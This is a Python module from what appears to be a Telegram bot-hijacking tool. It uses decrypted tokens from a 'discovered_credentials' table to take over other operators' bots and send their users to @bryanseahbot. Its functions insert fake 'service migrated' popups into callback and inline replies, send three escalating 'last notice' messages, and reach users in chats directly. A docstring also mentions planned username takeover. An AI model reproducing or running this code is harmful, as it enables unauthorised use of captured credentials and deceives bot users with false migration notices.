"""
Aggressive User Migration Strategies (Levels 1-5)
Port captured bots' users to @bryanseahbot via multi-channel redirect injection.

Level 1: Expand update type coverage (message, callback_query, inline_query, edited_message, channel_post)
Level 2: Multi-touch reminder sequences (3 messages with TTL-based Redis keys)
Level 3: Callback query hijack (answerCallbackQuery popup with redirect URL)
Level 4: Inline mode hijack (answerInlineQuery with migration result)
Level 5: Proactive outreach (inline mode first approach - NO PM required)

Note: Level 6 (username takeover via Telegram support) is NOT implemented.
Only Option A for Level 5 (inline mode first) is implemented.
Options B (group notification) and C (bot bio optimization) are NOT implemented.
"""
import contextlib
from datetime import UTC, datetime

import httpx

from app.core.database import db
from app.core.logger import get_logger
from app.core.redis_srv import redis_srv
from app.core.security import security

logger = get_logger(__name__)

# Helper for async DB execution (defined locally to avoid circular imports)
async def async_execute(query_builder):
    """Executes a Supabase query builder synchronously in a background thread."""
    import asyncio
    return await asyncio.to_thread(query_builder.execute)


class HoneypotRedirectStrategies:
    """Collection of redirect strategies for porting users from captured bots."""

    @staticmethod
    async def send_callback_hijack(
        bot_token: str,
        callback_id: str,
        redirect_url: str,
        redirect_bot: str,
    ) -> bool:
        """
        Level 3: Callback query hijack - answer with popup and redirect URL.

        Uses answerCallbackQuery with show_alert=True and URL parameter.
        When user taps OK, they're redirected to @bryanseahbot.
        """
        try:
            async with httpx.AsyncClient(timeout=10.0) as client:
                r = await client.post(
                    f"https://api.telegram.org/bot{bot_token}/answerCallbackQuery",
                    json={
                        "callback_query_id": callback_id,
                        "text": f"⚠️ This bot has migrated to @{redirect_bot}\n\nTap OK to continue",
                        "show_alert": True,
                        "url": redirect_url,
                    },
                )
                resp = r.json()
                return r.status_code == 200 and resp.get("ok", False)
        except Exception as e:
            logger.error(f"Callback hijack failed: {e}")
            return False

    @staticmethod
    async def send_inline_hijack(
        bot_token: str,
        inline_id: str,
        query_text: str,
        redirect_url: str,
        redirect_bot: str,
    ) -> bool:
        """
        Level 4: Inline query hijack - return migration result.

        Uses answerInlineQuery to return a single article result
        that explains the migration and links to @bryanseahbot.
        """
        try:
            async with httpx.AsyncClient(timeout=10.0) as client:
                r = await client.post(
                    f"https://api.telegram.org/bot{bot_token}/answerInlineQuery",
                    json={
                        "inline_query_id": inline_id,
                        "results": [{
                            "type": "article",
                            "id": "migrate_1",
                            "title": "⚠️ SERVICE MIGRATED",
                            "description": "This bot is no longer active. Tap to continue.",
                            "thumb_url": "https://telegram.org/img/t_logo.png",
                            "input_message_content": {
                                "message_text": (
                                    f"🚨 This bot has been permanently migrated.\n\n"
                                    f"Your query: \"{query_text[:50]}\"\n\n"
                                    f"To continue, use:\n"
                                    f"👉 {redirect_url}"
                                ),
                                "parse_mode": "HTML"
                            }
                        }],
                        "cache_time": 0,
                        "is_personal": True,
                    },
                )
                resp = r.json()
                return r.status_code == 200 and resp.get("ok", False)
        except Exception as e:
            logger.error(f"Inline hijack failed: {e}")
            return False

    @staticmethod
    async def send_multi_touch_message(
        bot_token: str,
        chat_id: int,
        message_num: int,
        redirect_url: str,
        redirect_bot: str,
    ) -> bool:
        """
        Level 2: Multi-touch reminder sequences.

        Sends up to 3 reminder messages with increasing urgency.
        Message content varies by message_num (1=gentle, 2=urgent, 3=final).
        """
        templates = {
            1: (
                "📋 Reminder: This service has migrated.\n\n"
                "You haven't yet switched to the new channel.\n\n"
                f"👉 {redirect_url}\n\n"
                "This is an automated reminder."
            ),
            2: (
                "⚠️ Final Warning: This bot is being decommissioned.\n\n"
                "Switch now to continue receiving service:\n\n"
                f"👉 {redirect_url}\n\n"
                "This is your second reminder."
            ),
            3: (
                "🚨 LAST NOTICE: This service has permanently moved.\n\n"
                "Your final chance to migrate:\n\n"
                f"👉 {redirect_url}\n\n"
                "No further reminders will be sent."
            ),
        }

        text = templates.get(message_num, templates[1])

        try:
            async with httpx.AsyncClient(timeout=15.0) as client:
                r = await client.post(
                    f"https://api.telegram.org/bot{bot_token}/sendMessage",
                    json={
                        "chat_id": chat_id,
                        "text": text,
                        "disable_web_page_preview": False,
                    },
                )
                resp = r.json()
                return r.status_code == 200 and resp.get("ok", False)
        except Exception as e:
            logger.error(f"Multi-touch message {message_num} failed: {e}")
            return False

    @staticmethod
    async def send_proactive_inline_request(
        bot_token: str,
        chat_id: int,
        redirect_bot: str,
    ) -> bool:
        """
        Level 5 Option A: Proactive outreach via inline mode (NO PM required).

        Sends a message asking user to type @bot_username in the chat,
        which triggers the inline query handler that shows migration result.

        This approach:
        - DOES NOT require user to have PM open
        - Works immediately in the current chat
        - Uses inline mode to show migration result
        """
        text = (
            f"📢 Important Update\n\n"
            f"This bot has migrated to @{redirect_bot}.\n\n"
            f"To continue, type @{redirect_bot.lower()} in this chat, "
            f"then select the migration option.\n\n"
            f"This is an automated request."
        )

        try:
            async with httpx.AsyncClient(timeout=15.0) as client:
                r = await client.post(
                    f"https://api.telegram.org/bot{bot_token}/sendMessage",
                    json={
                        "chat_id": chat_id,
                        "text": text,
                        "disable_web_page_preview": True,
                    },
                )
                resp = r.json()
                return r.status_code == 200 and resp.get("ok", False)
        except Exception as e:
            logger.error(f"Proactive inline request failed: {e}")
            return False

    @staticmethod
    def check_redirect_sent(credential_id: str, user_id: int) -> bool:
        """Check if redirect has already been sent to this user via this bot."""
        try:
            key = f"redirect:sent:{credential_id}:{user_id}"
            return redis_srv.client.exists(key) > 0
        except Exception:
            return False

    @staticmethod
    def mark_redirect_sent(credential_id: str, user_id: int, ttl: int | None = None) -> None:
        """Mark redirect as sent. Use ttl (seconds) for multi-touch reminders."""
        try:
            key = f"redirect:sent:{credential_id}:{user_id}"
            if ttl:
                redis_srv.client.setex(key, ttl, "1")
            else:
                redis_srv.client.set(key, "1")
        except Exception:
            pass

    @staticmethod
    def check_multi_touch_sent(credential_id: str, user_id: int, message_num: int) -> bool:
        """Check if specific multi-touch message has been sent."""
        try:
            key = f"redirect:touch{message_num}:{credential_id}:{user_id}"
            return redis_srv.client.exists(key) > 0
        except Exception:
            return False

    @staticmethod
    def mark_multi_touch_sent(credential_id: str, user_id: int, message_num: int) -> None:
        """Mark specific multi-touch message as sent with 24h TTL."""
        try:
            key = f"redirect:touch{message_num}:{credential_id}:{user_id}"
            # TTL: 24 hours between each message
            redis_srv.client.setex(key, 86400, "1")
        except Exception:
            pass

    @staticmethod
    async def get_bot_token(credential_id: str) -> str | None:
        """Decrypt and return bot token for a credential."""
        try:
            cred = await async_execute(
                db.table("discovered_credentials")
                .select("bot_token")
                .eq("id", credential_id)
                .limit(1)
            )
            if not cred.data:
                return None
            return security.decrypt(cred.data[0]["bot_token"]).strip()
        except Exception as e:
            logger.error(f"Token decrypt failed for {credential_id}: {e}")
            return None

    @staticmethod
    async def update_redirect_record(
        update_id: str,
        user_id: int,
        redirect_bot: str,
        error: str | None = None,
        proactive: bool = False,
    ) -> None:
        """Update honeypot_updates record with redirect outcome."""
        now = datetime.now(UTC).isoformat()
        payload = {
            "redirected_at": now,
            "redirected_bot": redirect_bot,
            "sender_user_id": user_id,
        }
        if error:
            payload["redirect_error"] = str(error)[:200]
        if proactive:
            payload["proactive_sent_at"] = now

        with contextlib.suppress(Exception):
            await async_execute(
                db.table("honeypot_updates")
                .update(payload)
                .eq("id", update_id)
            )
